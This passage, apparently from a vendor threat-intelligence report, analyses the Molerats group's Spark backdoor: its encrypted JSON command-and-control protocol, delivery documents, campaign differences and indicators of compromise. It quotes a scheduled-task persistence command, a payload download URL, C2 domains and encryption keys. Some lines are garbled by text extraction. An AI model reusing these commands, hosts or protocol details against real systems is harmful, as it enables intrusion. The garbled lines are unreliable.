number,\nsuch as {\"Allier\" : 7}. We are unsure of the purpose of this transmission or how the payload uses this number value, but Figure 11 shows the\nbase64 encoded ciphertext containing the “Allier” field\n\n\n-----\n\nFigure 11 C2 server providing the Allier JSON\n\nobject\nAfter receiving the “Allier” JSON object, the payload will send the results of the executed command(s) to the C2 server. The payload will create\na JSON object with an array named “Zeke”, which will contain JSON objects that have a “FrederickT” field used to store the result of the\ncommand, a “ReesefP” field to denote the task identifier, and a “KaileeXws” field to store a boolean if the command was successful. The\nresulting JSON would look like the following when the result of the ‘whoami’ command issued by the C2 is “test-system\\<redacted>”:\n\n{\"Zeke\":[{\"FrederickT\":\"5yUu16Ae8WKt<redacted>\",\"KaileeXws\":true,\"ReesefP\":5}]}\n\nThe payload will base64 encode this data and set the “CallieVK” field in the outbound JSON object with the “ReeceWNM” field set to the\n“Winston” communication type, as seen in the following:\n\n{\"CallieVK\":\"eyJaZWtlIjpbeyJGcmVkZXJpY2tUIjoiNXlVdTE2QWU4V0t0aX<redacted>0iLCJLYWlsZWVYd3MiOnRydWUsIlJlZXNlZlAiOjV9XX0=\",\"\n\nThe payload will then encrypt this JSON object and send it to the C2 server to exfiltrate the results of the issued command. Figure 12 shows\nthe HTTP POST request containing the encrypted JSON object that contains the “Winston” communication type.\n\nFigure 12. Payload sending the results of the issued command to the C2 server\nAfter sending the results of the initial commands, the payload expects the C2 to reply with a JSON object with a “Garrison” field set to a\nnumber, such as “{\"Garrison\" : 8}”. Figure 13 shows the C2 server responding with ciphertext of the JSON object with the “Garrison” field.\n\nFigure 13. C2 server sending the\n\nGarrison JSON object to the payload\nThis concludes the check-in and initial command execution portion of the C2. The payload will enter a loop to continuously send HTTP\nrequests to obtain additional commands to run using the same sequence of JSON objects previously explained starting after the “JoslynKe”\ncommunication type that sent the system information to the C2. Instead of sending the system information to the C2 and parsing the response\nfor a command, each iteration of this loop will start with a communication type of “VanessaFM” as seen here:\n\n{\"CallieVK\":\"eyJBZGVsaW5lUkQiOiJ2Y0picTZuemdKaz0iLCJBdmVyaXp0IjoiMSIsIkJyYW5kZW50bEsiOjEsIk1hdGhpYXNOYm8iOlt7IkFkYWx5bm\n\n\n-----\n\ne data t e Ca e e d decodes to a JSO object t at as se e a e ds, o e o c s a a ay ca ed at as bo t at co ta s\nJSON objects that transmit the UUID for the compromised system in a field named “CollinsPM” that was previously transmitted to the C2 in the\n“ZaydenlnL” field of the “JoslynKe” communication type. The JSON object also contains a field “AdelineRD” that contains a nickname or\ncampaign identifier value in the form of base64 encoded ciphertext. We have compiled a list of campaign codes of known Spark payloads,\nwhich we have included in the Appendix. The resulting JSON object will look like the following:\n\n{\"AdelineRD\":\"vcJbq6nzgJk=\",\"Averizt\":\"1\",\"BrandentlK\":1,\"MathiasNbo\":[{\"AdalynngS\":1,\"CollinsPM\":\"\"<base64 encoded ciphertext of UUID\nseen in ZaydenlnL field>\",\"Nevaeh\":true}]}\n\nThis JSON is encrypted and base64 encoded and sent to the C2 server, as seen in Figure 14. The payload will use the same JSON each\niteration of the main loop and will expect the C2 to provide the same sequence of responses as discussed before that contain “Jordanlzw”,\n“Allier”, and “Garrison” fields to receive additional commands.\n\nFigure 14. Payload issuing HTTP POST to C2 server requesting further commands\n\n## Comparison between 2019 and 2020 campaigns\n\n[While collecting additional Spark samples, we found samples from a 2019 campaign and newer samples that were compiled in January 2020](https://ti.360.net/blog/articles/suspected-molerats-new-attack-in-the-middle-east-en/)\n[used in the Spark Campaign. The delivery documents and Spark payloads used in these campaigns differ from the delivery document we](https://www.cybereason.com/blog/new-cyber-espionage-campaigns-targeting-palestinians-part-one)\nobserved in the October and November 2019 attacks. At a high level, the January 2019 delivery document was self-contained as it had its\npayload embedded within it, while the October 2019, November 2019 and January 2020 delivery documents required interacting with a remote\nserver. The October 2019 and January 2020 documents differ as the former attempts to download a VBScript that downloads a payload from\nthe actor controlled server, whereas the January 2020 document attempts to load a remote template from Google Drive whose macro attempts\nto download a payload from Google Drive. The known Spark payloads installed by each of these delivery documents differ as well, which we\nwill compare with the known payload from the November attack discussed earlier in this blog.\n\nWe analyzed a delivery document from the 2019 campaign and found that it was a macro-enabled Word document\n(SHA256:40b7a1e8c00deb6d26f28bbdd3e9abe0a483873a4a530742bb65faace89ffd11). The macro made the decoy contents by setting a\ntextbox in the document to visible with the line “Shapes(\"textbox1\").Visible = True”, while the attacks discussed earlier in this blog did not\nattempt to display any updated decoy contents. Another marked difference is that while both the January and October 2019 delivery\ndocuments wrote to a secondary VBScript %userprofile%\\wmsetup.vbs and programdata\\Micorsoft\\Microsoft.vbs respectively, the\nwmsetup.vbs script contains the binary payload while Microsoft.vbs attempts to download another VBScript that will download the binary\npayload. The wmsetup.vbs script decodes an embedded base64 encoded payload\n(SHA256:9511940ed52775aef969fba004678f4c142b33e2dd631a0e8f4e536ab0b811db\n\n), saves it to %temp%\\ihelp.exe and creates a scheduled task for persistence by running the following command:\n\nschtasks /create /f /sc minute /mo 1 /tn ihelp /tr %temp%\\ihelp.exe\n\nA few notable characteristics of the Spark payload delivered in January 2019 include the use of different freely-available libraries from other\n[known samples, such as using the msgpackv1 library instead of JSON to structure its configuration and C2 communications, as well as using](https://github.com/msgpack/msgpack-c)\nthe [SFML library instead of cURL. Also, unlike the Spark payload delivered in November 2019, this payload uses the AES cipher to decrypt its](https://github.com/SFML)\nconfiguration and other pertinent strings and to encrypt and decrypt network communications with its C2. It uses the entire SHA256 hash of a\nsupplied key string without using the custom rolling XOR cipher on the key and ciphertext as discussed earlier in this blog. The decrypted\nconfiguration from this payload structured using msgpack appears as follows:\n\n\\x88\\xa4jevG\\xadsmartweb9[.]com\\xa3JRk\\xa1/\\xa3ufRP\\xa4qNxp\\x00\\xa4kfds\\xa0\\xa4WjaS\\x01\\xa3WnF\\xb8OMfX5GiCmOICUvhunB2lWQ==\\xa\n\nWe also analyzed a delivery document from the 2020 Spark campaign\n(SHA256:8c0966c9518a7ec5bd1ed969222b2bcf9420295450b7ed2f45972e766d26ded8) and it differed from both the January and October\n2019 delivery documents. First, the initial delivery document did not contain a macro, rather it attempts to load a remote template from Google\nDrive, specifically at the following URL:\n\n\n-----\n\nps //d e goog e co /uc e po t do oad&d bC j 89 5 U S8\n\nThe remote template (SHA256:a0ae5cc0659693e4c49d3597d5191923fcfb54040b9b5c8229e4c46b9330c367) contains a macro that attempts\nto download an executable from the following URL:\n\nhxxs://drive.google.com/uc?export=download&id=1yiDnuLRfQTBdak6S8gKnJLEzMk3yvepH\n\nThe executable hosted at the Google Drive link (SHA256:7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128) is a\ncompiled AutoIt script that attempts to install a Spark backdoor to %userprofile%\\runawy.exe, which is the same exact dropper and payload as\nwe observed installed by the “attachment.doc” delivery document discussed earlier in this blog.\n\nTable 6 shows a comparison of features in the Spark payloads discussed in this section. Unfortunately, we were unable to obtain the payload\ninstalled by the MOFA-related Word documents delivered in the October 2019 attacks. If we compare the Spark samples installed by the\ndelivery documents in January 2019 and 2020 with the Spark sample installed by the Pictures.pdf delivery document in November 2019, we\nsee notable differences that suggest this threat group is continually developing this backdoor.\n\n**Feature** **Jan. 2019 Spark** **Nov. 2019 Spark (Pictures.pdf)** **Oct. and Nov. 2019 “attachment.doc”**\n**and Jan. 2020 “The Spark Campaign”**\n\nDropper None Compiled AutoIt script Compiled AutoIt script\n\nHTTP Library [SFML](https://github.com/SFML) [cURL 7.56.0-DEV](https://github.com/curl/curl/releases/tag/curl-7_56_0) [elnormous' HTTPRequest](https://github.com/elnormous/HTTPRequest)\n\n\nConfiguration\nStructure\n\nPayload\nPacker\n\n\n[msgpack version 1](https://github.com/msgpack/msgpack-c) [JSON for Modern C++ v2.1.1](https://github.com/nlohmann/json/releases/tag/v2.1.1) [JSON for Modern C++ v3.7.0](https://github.com/nlohmann/json/releases/tag/v3.7.0)\n\nEnigma Virtual Box Enigma (5.X) Enigma (5.X)\n\n\nCipher used AES on ciphertext Rolling XOR on key and ciphertext +\n3DES on ciphertext\n\n\nEncrypted\ndata\n\n\nConfiguration, Names for C2 comms,\nCommands to gather system\ninformation\n\n\nConfiguration, Names for C2 comms,\nCommands to gather system\ninformation\n\n\nRolling XOR on key and ciphertext +\ncustom AES decrypting 16-byte chunks of\nciphertext\n\nConfiguration, Names for C2 comms\n\n\nPersistence Scheduled task LNK Shortcut in @StartupDir Scheduled task, Copied executable in\n@StartupDir\n\n_Table 6. Comparison of Spark payloads delivered in January 2019, October 2019, November 2019 and January 2020_\n\n## Connection to Downeks\n\n[Kaspersky’s report mentioned the sub-groups of Molerats (AKA the Gaza Cybergang) are responsible for the Operation Parliament campaign](https://securelist.com/gaza-cybergang-group1-operation-sneakypastes/90068/)\n[that delivered the Spark payload and we observed this threat group delivering the Downeks in the DustySky campaign. We observed some](https://unit42.paloaltonetworks.com/unit42-downeks-and-quasar-rat-used-in-recent-targeted-attacks-against-governments/)\nsimilarities between Spark and Downeks from a development and installation perspective.\n\nFor instance, we observed the same binder Trojan, which is a malicious application used to open a decoy document and to install a payload,\none installing a Downeks payload and two others installing Spark. The binder Trojan installing Downeks was compiled in December 2015 and\n[was used during the DustySky campaign as mentioned in our blog (SHA256:](https://unit42.paloaltonetworks.com/unit42-downeks-and-quasar-rat-used-in-recent-targeted-attacks-against-governments/)\n75336b05443b94474434982fc53778d5e6e9e7fabaddae596af42a15fceb04e9), while we have two samples of this binder Trojan installing\nSpark samples that were compiled in November 2017 (SHA256:4889318807225e51bae4d9d9a536e5775eaf92685b289eef6839f9d89f8c4b85)\nand April 2018 (SHA256:23cf013ab91e6bd964c4d9a5d48c188a09838c32a75db68dd0690418f5ca7e7c).\n\nFrom a development perspective, both the Downeks and Spark payloads use libraries and code from several open-source projects available\non GitHub to carry out its C2 communications and to structure data in JSON. First, Spark uses the cURL library for C2 communications,\n[specifically version 7.56.0-DEV whose source code is available on GitHub, while Downeks](https://github.com/curl/curl/releases/tag/curl-7_56_0)\n(SHA256:9347a47d63b29c96a4f39b201537d844e249ac50ded388d66f47adc4e0880c7) used cURL to communicate with the C2 server, but an\nearlier version (7.39.0). Second, the payload uses JSON to parse its configuration and to structure its messages sent to and from the C2\nserver, which it uses JSON for Modern C++ Version 2.1.1 [also available on GitHub. The previously mentioned Downeks also used JSON to](https://github.com/nlohmann/json/releases/tag/v2.1.1)\nparse its configuration and to structure the data it sends and receives from its C2 server. However, it used Tencent’s RapidJSON again freely\navailable on GitHub. This fits our previous observations of the developer of Spark using different JSON libraries within different versions of\nSpark.\n\n## Conclusion\n\nMolerats, also known as the Gaza Hacking Team and the Gaza Cybergang, has been targeting eight organizations in six different countries in\nthe government, telecommunications, insurance and retail industries between October 2019 through the beginning of December 2019. This\ngroup uses spear-phishing emails to deliver both malicious Word and PDF documents, and attempts to social engineer the victim into an\n\n\n-----\n\nect o at e t a t y g to e p o t a so t a e u e ab ty so, t e g oup uses t e Spa bac doo attac s, but co t ues to de e op t s\ntool using different freely available libraries to structure important data and to carry out C2 communications.\n\nPalo Alto Networks customers are protected from the attacks discussed in this blog by:\n\nAll known Spark payloads and delivery documents have malicious verdicts in WildFire\nAll known Spark C2 domains and domains used in the delivery are marked with malicious classifications and verdicts in PANDB and\nDNS Security\n[AutoFocus customers can track the delivery documents and payloads with the tags: Molerats_Spark](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Molerats_Spark)\n\n## Appendix\n\n### Indicators of Compromise\n\n**Files related to MOFA documents**\n\nd19104ef4f443e80c21375f1b779f00c960e0193e8aade69d7ad87a11f39c897 - MOFA- 031019.doc\n\ndc3311b3a827840c25689c0e153f2c09ba9583bcf18cdc43b88b12cf9846e94b - Microsoft.vbs\n\nc45b5b01e1c3284fd694db6aa0ebeab8abe78d9bb12eb41b957cd121d97b3516 - PlayerVLC.vbs\n\n03be1d7e1071b018d3fbc6496788fd7234b0bb6d3614bec5b482f3bf95aeb506 - MOFA- 061019.doc\n\n725d907b33cca8cec22f561068a3a8abf3616a8e2f452adb7fbd4aec20390f06 - Microsoft.vbs\n\n**Files related to Attachment.doc**\n\neaf2ba0d78c0fda95f0cf53daac9a89d0434cf8df47fe831165b19b4e3568000 - attachment.doc\n\n7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128 - rundll64.exe\n\n64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431 - runawy.exe\n\n**Files related to Pictures.pdf**\n\n9d6ce7c585609b8b23703617ef9d480c1cfe0f3bf6f57e178773823b8bf86495 - Pictures.pdf\n\n1742caf26d41641925d109caa5b4ebe30cda274077fbc68762109155d3e0b0da - Pictures.rar\n\n92d0c5f5ecffd3d3cfda6355817f4410b0daa3095f2445a8574e43d67cdca0b7 - ﻫﺬه ﻋﯿﻨﺔ ﻗﻠﯿﻠﺔ ﻣﻦ اﻟﺼﻮر.exe\n\n5139a334d5629c598325787fc43a2924d38d3c005bffd93afb7258a4a9a8d8b3 - pdf.exe\n\n**Related Spark payloads and Delivery documents**\n\nee9f90819a578c8256fc950f62bd9f7b051edbee06618a26fa21c2875c3c301e - ﻗﺎﺋﻤﺔ اﻟﺤﻜﻮﻣﺔ اﻟﺞ973 اﻟﻤﺬﻛﺮة رﻗﻢ (Note No. 973 Government List c)\n\n9451a110f75cbc3b66af5acb11a07a8d5e20e15e5487292722e695678272bca7 - GoogleChrome.vbs\n\nddf938508618ff7f147b3f7c2b706968cace33819e422fe1daae78bc256f75a8 - MOFA- 101019.doc\n\n4f51b180a6d0b074778d055580788dc33c9e1fd2e49f3c9a19793245a8671cba - Microsoft.vbs\n\nfeec28c7c19a8d0ebdca8fcfc0415ae79ef08362bd72304a99eeea55c8871e21 - اﻟﺘﻘﺮﯾﺮ اﻟﯿﻮﻣﻲ ﺣﻮل أﻫﻢ اﻟﻤﺴﺘﺠﺪات اﻟﻔﻠﺴﻄﯿﻨﯿﺔ ﻟﯿﻮم - 9 - 9 - 2019.doc (Daily\nreport on the most important Palestinian developments, 9-9-2019.doc)\n\nbf126c2c8f7d4263c78f4b97857912a3c1e87c73fee3f18095d58ef5053f2959 - 2019 - 9 - 9 -اﻟﺘﻘﺮﯾﺮ اﻟﯿﻮﻣﻲ ﺣﻮل أﺧﺮ ﻣﺴﺘﺠﺪات اﻹرﻫﺎب اﻟﻌﺎﻟﻤﻲ.doc (Daily\nupdates on the latest terrorism report Alaalmi- 9 - 9 - 2019.doc)\n\n243f1301d1d759c17cd49336512ebceb9d347995c90a6e00aff926439d63f12d - Daily Report.rar\n\n602828399e24dca9259a4fc4c26f07408d1e0a638c015109c6c84986dc442ebb\n\neaf2ba0d78c0fda95f0cf53daac9a89d0434cf8df47fe831165b19b4e3568000\n\n273aa20c4857d98cfa51ae52a1c21bf871c0f9cd0bf55d5e58caba5d1829846f\n\n71ea0ba573451b14bb411ad28e5aac883f8af0376db8c9d34f309778c901c5d6\n\na0ae5cc0659693e4c49d3597d5191923fcfb54040b9b5c8229e4c46b9330c367\n\n8c0966c9518a7ec5bd1ed969222b2bcf9420295450b7ed2f45972e766d26ded8\n\n7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128\n\n64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431\n\ne8d73a94d8ff18c7791bf4547bc4ee2d3f62082c594d3c3cf7d640f7bbd15614\n\n\n-----\n\n6e60 5c65 99ee b 5 5c83d3bb36 5 65 b 6e 36 8 5 c 6b 96\n\nb08b8fddb9dd940a8ab91c9cb29db9bb611a5c533c9489fb99e36c43b4df1eca\n\na6e0297777ba29e21e5d1acca6210d436eee5c2b93d2dec27910ffd6e2266559\n\n6e896099a3ceb563f43f49a255672cfd14d88799f29617aa362ecd2128446a47\n\ncf32479ed30ae959c4ec8a286bb039425d174062b26054c80572b4625646c551\n\n92d0c5f5ecffd3d3cfda6355817f4410b0daa3095f2445a8574e43d67cdca0b7\n\n5139a334d5629c598325787fc43a2924d38d3c005bffd93afb7258a4a9a8d8b3\n\n89acce7cdd354a04f2edd4a2226caf5c47246a8196ec1d9b98159da38ec20c24\n\nb654dd768912e09b9c71eb388995b1d69b5baa45e970a6afc42733d647220712\n\ndaa72ba2b9525d74e0a3564d0d72e06eed27d04ce63fe98c45b1e84cee09987c\n\nc39e3adb6e15b9964bf0f9702b632086951b4ed9f9fb9cadd6975962a031a398\n\n255a29f88150285a9553f67a6475dc50fcbb5fc737a0178cc0e737d49c8d1b20\n\n4889318807225e51bae4d9d9a536e5775eaf92685b289eef6839f9d89f8c4b85\n\n23cf013ab91e6bd964c4d9a5d48c188a09838c32a75db68dd0690418f5ca7e7c\n\n75336b05443b94474434982fc53778d5e6e9e7fabaddae596af42a15fceb04e9\n\n9a3ec0a8b2a88106fc537d9cae1989f6fba36bb43352a944d2031e7b2ab7673c\n\n89d7337ac102cd80316ad59a1dcfcc5c7849d0e7520f0f85e1781574423e38ea\n\n19ede61c865a3cdd59d3a5d1a79b7ce83ca7828a6b80a2f968d82b5b56a8603c\n\nf9df76f634586c698b967209d83834b98ff3d245d47d6993bfb27a0aa819d9b9\n\n704b19e0460a0fa7d952ba6feb5eadb9054895d1d753df72faf6f470446a0519\n\n194c236a3eed81f3180bdcc5bcbd29b782b1a0ef7962ceb1c4cb892a427563ff\n\nfc420a49b1e9e2200238a4846110c2e4e63bfe6d7088645f49ebb65718a70b7f\n\nbc9353adc58b983b080b61950fc6689ee340797458fc4fd8a1d6f492976aa0e2\n\n8c6dc796b35ef405c42c78e1011cc4a6df09315264d638271cb0674d044886cf\n\n9d49020debdc6ab63de249fd9289d51415395fc8b1e8a15a82f200bf90e674ee\n\n5b6e43d434148bfcf52fd441f64836ae35f4f0ed9d75bf9707f521bcbb7c0380\n\n3a32c81ec609a5466f050c09156f25b5561c691763f865ee437e95a246dcbbe1\n\nc3e23a42dc49b039828da6cef4ebb7226c85163651a69085ee7e1899aa804fed\n\n26b032a9b6a22047eb48f1fb1553827a5b85aa7229422d650fa1f37c48b3aeb1\n\n8e5bf597948ea6ad39f0030053978d1a14e1c3dbb4abf044a223e14544c73b7f\n\n1513032544512718d068b2f6e8b5087cae9fc446e40cd56c03ab7bbbe047add5\n\nd04276760d722c241e831dacee7cf9d63cb123ce7188d604df1c56c1197d7160\n\n83750372d4e8c043d6f916ec398303dc929b59e05b7f5a9dc5485e4530047f4a\n\n23cf013ab91e6bd964c4d9a5d48c188a09838c32a75db68dd0690418f5ca7e7c\n\nbf4cdb277881754db2f44a014c08ce1857c9c0c47c6c1c8582782b5c887241e2\n\n58376e763ef0ca9dccad55e043794b5ec0b34c8c2a20604cff0b26f216e3c1e2\n\n399344aa609f17e558356709a398b4478e5c737c7cc843e3d111d33192c35e5a\n\n\n-----\n\nc 3 8 68 b8e 08 8 9 566860b 5a5d d9b 8b 6 0d 6 866e6cb 9d\n\nab2335ba3abe97a02a3a2d1b063a08ae649406f88d4cf02d22d724e649b9e7be\n\na4c6aea61953d515d38d75ae7b3ef2a37bb26d1f838722f0a67624d6a728549e\n\n51c1e6ce3ff1f42734bfa19a7142b5154172232afc5528dad4c527df3a44c0c1\n\n329e9e98f08f3d6a017254dd033984cfd6421ccab5b323ebace5d68662a98a09\n\n0631ed0995e21ec8f02f6167824eca92e84abfd8cf4dbbd9c7c88f88d4f570cd\n\nd010ef2b6664779b3c8cfa0a5179b7331d88d34d04350ebeeecb3bae65654393\n\n4889318807225e51bae4d9d9a536e5775eaf92685b289eef6839f9d89f8c4b85\n\n51042cac30b4d6072f79b3f9b27d8ee7b65f438549c90f57dc5fecc17d35054a\n\nec0d30d2fdd301bf0cfe66028c9a37d5535a8161909d0d3573447d1843f61c97\n\ne6e5593cbac23ec5c51e5f63c4c6616a8eb71697a89f9d1d17cc7be91c36e3e9\n\n36166db096ddb50af4f5c4be48b4274c535f40c74ce3450d4ad3bdaa2c28beb3\n\n966ad6452793b1562f0081456a951d3310d4e7690fa74ef8ff4046778bd37168\n\nb2437a54195d51435ad07867a5cb069e831fdd8e48bb70daa3894fde40754bc8\n\nfe19ab4fd65531163d197d565201c2afea7d9f8e74e5f75c714eb5fe086a02fd\n\n212aa6e3f236550bb4b9328071ee4f0e8a74465c75dcf1e6cde8502afde91364\n\ne489e5297ed8cf594c2a5160eff79b12b9ee68e36e0d00ed31f44b75c4a38f61\n\n0eebc31bb64ba0aa0ea335a5f35392ff1d058e97bf5cb5b46d7a89b197dcba7a\n\nfe0f23d6675260dd40f277906aa3dd34cbef2243336334dda10ad4500f8e6883\n\n7c5a9ce04002be953c556b5b50c10f8d462abc92d1ffe28a325d7ea741701be1\n\n45a2c50edd710476e0de8ece6cc5931035ce8183ac4cf521d494d94744d44c2c\n\nb84f2497e4cfeac240b1815b22741609e5a31f0be11667a3c7256c16788728ec\n\n78696cf4370817cb0ffd6930a92553d3551fe77cdc6d45638ddd13f05b9218b8\n\n5109f2c8f014698f1d2f0d59a7c9cc1cd9400a6fe4dcde95cc475f453e74bc6e\n\nab4e43b4e526d44bf12ae5113184afdf5c15630808f674f5e1a472eb6811ce3f\n\ndaa72ba2b9525d74e0a3564d0d72e06eed27d04ce63fe98c45b1e84cee09987c\n\n64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431\n\n6e60f5c65299ee7f7b257f5c83d3bb36154654b26e721136f7184514fcf6b296\n\nB08b8fddb9dd940a8ab91c9cb29db9bb611a5c533c9489fb99e36c43b4df1eca\n\ncf32479ed30ae959c4ec8a286bb039425d174062b26054c80572b4625646c551\n\n9511940ed52775aef969fba004678f4c142b33e2dd631a0e8f4e536ab0b811db\n\ne3779f6252ca606ace9ae06623ba086d1a441582b625e433799260d71cdb1b4b\n\ne6e9f7b0449976537d9276192e5767c9909cd34df028a8bf1cac3dbe490f0e73\n\n69df8e4bdc3fd69deb6c866254f80f6288549222ed0d07ccd4c05597e75414df\n\n40b7a1e8c00deb6d26f28bbdd3e9abe0a483873a4a530742bb65faace89ffd11\n\n### Related Delivery Domains\n\nservicebios[.]com\n\n\n-----\n\ndapoe edd g[ ]co\n\nzmartco[.]com\n\n### Spark C2 Domains\n\nwebtutorialz[.]com\n\nnysura[.]com\n\nlaceibagrafica[.]com\n\nmotoqu[.]com\n\nsmartweb9[.]com\n\nlaptower[.]com\n\napp.msexchanges16[.]com\n\nmsexchange13[.]com\n\ncloudserviceapi[.]online\n\nupdates.masterservices[.]online\n\nclients.itresolver[.]online\n\nupdate.itresolver[.]online\n\n91.219.237[.]99\n\ngoldenlines[.]site\n\nUpdate.nextdata[.]site\n\n## Spark First Names and More\n\n**Decrypted String** **Usage** **Description**\n\n\nLawrence C2\nChannel\n(from\npayload)\n\nAllier C2\nChannel\n(from C2)\n\nJaseN C2\nChannel\n(from\npayload)\n\nIvory C2\nChannel\n(from C2)\n\nJonas C2\nChannel\n(from C2)\n\nReginacy C2\nChannel\n(from C2)\n\nTrumanRd C2\nChannel\n(from C2)\n\nAlanih C2\nChannel\n(from C2)\n\n\nKey name in dictionary (JaseN) used to store the value of a task number provided in the Ivory field\n\nKey name used to store a number for an unknown purpose, but it is expected as a response to the\nMorganE communication type.\n\nKey name for a list of dictionaries in the MorganE communication type, represents the received\ntask numbers\n\nKey name in the Jordanlzw list used to store a number that we believe is a task number\n\nKey name in the Jordanlzw list used to store a boolean for an unknown reason\n\nKey name in the Jordanlzw list used to store a boolean to not create the process, rather just send\n'ok' back to C2\n\nKey name in the Jordanlzw list used to store the command line arguments to run with an\nexecutable\n\nKey name in the Jordanlzw list used to store the executable to to run\n\n\n-----\n\nAverizt C2\nChannel\n(from\npayload)\n\nMathiasNbo C2\nChannel\n(from\npayload)\n\nBrandentlK C2\nChannel\n(from\npayload)\n\nAdalynngS C2\nChannel\n(from\npayload)\n\nAdelineRD C2\nChannel\n(from\npayload)\n\nCollinsPM C2\nChannel\n(from\npayload)\n\nNevaeh C2\nChannel\n(from\npayload)\n\nLondonzO C2\nChannel\n(from C2)\n\nJoslynKe C2\nChannel\n(from\npayload)\n\nAngelxEv C2\nChannel\n(from\npayload)\n\nZaydenlnL C2\nChannel\n(from\npayload)\n\nHoustonod C2\nChannel\n(from\npayload)\n\nMaximiliano C2\nChannel\n(from\npayload)\n\nGarrison C2\nChannel\n(from C2)\n\nZeke C2\nChannel\n(from\npayload)\n\nReesefP C2\nChannel\n(from\npayload)\n\n\nKey name that stores a number in the VanessaFM communication type that is hardcoded within\nthe binary.\n\nKey name for a list of dictionaries in the VanessaFM communication type\n\nKey name that stores a number in the VanessaFM communication type that is hardcoded into the\nconfiguration.\n\nKey name in dictionary (MathiasNbo) used to store a number with unknown purpose.\n\nKey name that stores a base64 encoded encrypted string obtained from the payload configuration\nsent to the C2 in the VanessaFM communication type. Considered as a nickname or\ncampaign/payload identifier.\n\nKey name in dictionary (MathiasNbo) used to store the UUID also seen in the ZaydenlnL field\n\nKey name in dictionary (MathiasNbo) used to store a boolean with unknown purpose.\n\nKey name in the Jordanlzw list used to store a boolean to create a specified process and wait for\nreturn\n\nValue in ReeceWNM field to represent the transmission of system information\n\nKey name used in a system information dictionaries (Maximiliano) to store the information type\nvalue (1 = UUID, 2 = hostname, 3 = username)\n\nKey name used in a system information dictionaries (Maximiliano) to store the data associated with\nthe type specified in AngelxEv\n\nKey name used in a system information dictionaries (Maximiliano) to store the value \"1\" whose\npurpose is unknown\n\nKey name in JoslynKe communication type that stores a list of system information dictionaries\n\nKey name for a number value used by the payload possibly as a sleep interval before sending\nresults of additional commands.\n\nKey name for a list of dictionaries in the Winston communications type\n\nKey name within a dictionary within the Zeke array used to represent the task number\n\n\n-----\n\nFrederickT C2\nChannel\n(from\npayload)\n\nKaileeXws C2\nChannel\n(from\npayload)\n\nEverlyY C2\nChannel\n(from C2)\n\nCallieVK C2\nChannel\n(from\npayload)\n\nReeceWNM C2\nChannel\n(from\npayload)\n\nMorganE C2\nChannel\n(from\npayload)\n\nWinston C2\nChannel\n(from\npayload)\n\nJessicay C2\nChannel\n(from\npayload)\n\nVanessaFM C2\nChannel\n(from\npayload)\n\n\nKey name within a dictionary within the Zeke array storing the results of the executed command for\nthe task\n\nKey name within a dictionary within the Zeke array storing the boolean if the execution was\nsuccessful\n\nKey name for a number value used by the payload to idle for a specified number of seconds\n\nField in JSON sent to C2, used to store the communicated data\n\nField in JSON sent to C2, used to store the communication type\n\nValue in ReeceWNM field to represent the task number its about to send data regarding\n\nValue in ReeceWNM field to represent the transmission of command execution results\n\nValue in ReeceWNM field to represent the beacon\n\nValue in ReeceWNM field to represent the request for additional tasks\n\n\nrEA8GPZf4oIdOsjMxgFD Key Used to encrypt fields within JSON sent to C2, including system information gathered\n\n\nJordanlzw C2\nChannel\n(from C2)\n\nAryana C2\nChannel\n(from C2)\n\n\nKey name of a list of dictionaries that store commands to run\n\nKey name for a number value used to specify the number of commands to run that are stored in\nthe Jordanlzw list\n\n\n24 Config Minimum sleep interval between messages sent to C2\n\n119 Config Minimum sleep interval between failed C2 beacons\n\nJvFLb8pHNywoGdhtjsc5 Key Used to encrypt C2 communications\n\n## Spark Nicknames/Campaign Codes\n\n**SHA256** **Compile Time** **Nickname**\n\n0631ed0995e21ec.. 2017-03-27 2:46:06 28-10\n\n966ad6452793b15.. 2017-05-24 6:15:04 Nick name\n\n212aa6e3f236550.. 2017-05-24 6:15:04 Nick name\n\nab4e43b4e526d44.. 2017-05-24 6:15:04 Nick name\n\n36166db096ddb50.. 2017-10-07 7:06:22 bbb\n\nd010ef2b6664779.. 2017-10-07 7:06:23 28-10\n\n194c236a3eed81f 2017-10-22 7:03:45 sss\n\n\n-----\n\nfc420a49b1e9e22.. 2017-10-22 7:03:45 sss\n\nbc9353adc58b983.. 2017-10-22 7:03:45 sss\n\n9d49020debdc6ab.. 2017-10-22 7:03:45 Nick name\n\n3a32c81ec609a54.. 2017-10-22 7:03:45 3007\n\nc3e23a42dc49b03.. 2017-10-22 7:03:45 50852\n\n8e5bf597948ea6a.. 2017-10-22 7:03:45 O\n\n151303254451271.. 2017-10-22 7:03:45 Nick name\n\n83750372d4e8c04.. 2017-10-22 7:03:45 0204\n\n58376e763ef0ca9.. 2017-10-22 7:03:45 R\n\n1c43f8f68f7b8e4.. 2017-10-22 7:03:45 ood\n\nab2335ba3abe97a.. 2017-10-22 7:03:45 Nick name\n\na4c6aea61953d51.. 2017-10-22 7:03:45 Nick name\n\n329e9e98f08f3d6.. 2017-10-22 7:03:45 FUD\n\n78696cf4370817c.. 2017-10-22 7:03:45 Ben\n\nec0d30d2fdd301b.. 2017-10-28 10:55:21 28-10\n\n9511940ed52775a.. 2017-12-02 11:16:24 <blank>\n\n5139a334d5629c5.. 2019-09-16 10:00:45 bnvcs\n\n89acce7cdd354a0.. 2019-09-16 10:00:45 Docx\n\nb654dd768912e09.. 2019-09-16 10:00:45 2909\n\ndaa72ba2b9525d7.. 2019-09-16 10:00:45 PalCamp\n\n69df8e4bdc3fd69.. 2019-09-16 10:00:45 NewsMac\n\ncf32479ed30ae95.. 2019-12-30 9:45:44 1401\n\n64ea1f1e0352f3d.. 2020-01-12 10:57:50 FS1-2020\n\n6e60f5c65299ee7.. 2020-01-12 10:57:50 1801\n\nb08b8fddb9dd940.. 2020-01-12 10:57:50 FS1-2020\n\n04fa6aaea5e3a26.. 2020-01-12 10:57:50 up\n\n**Get updates from**\n\n**Palo Alto**\n\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
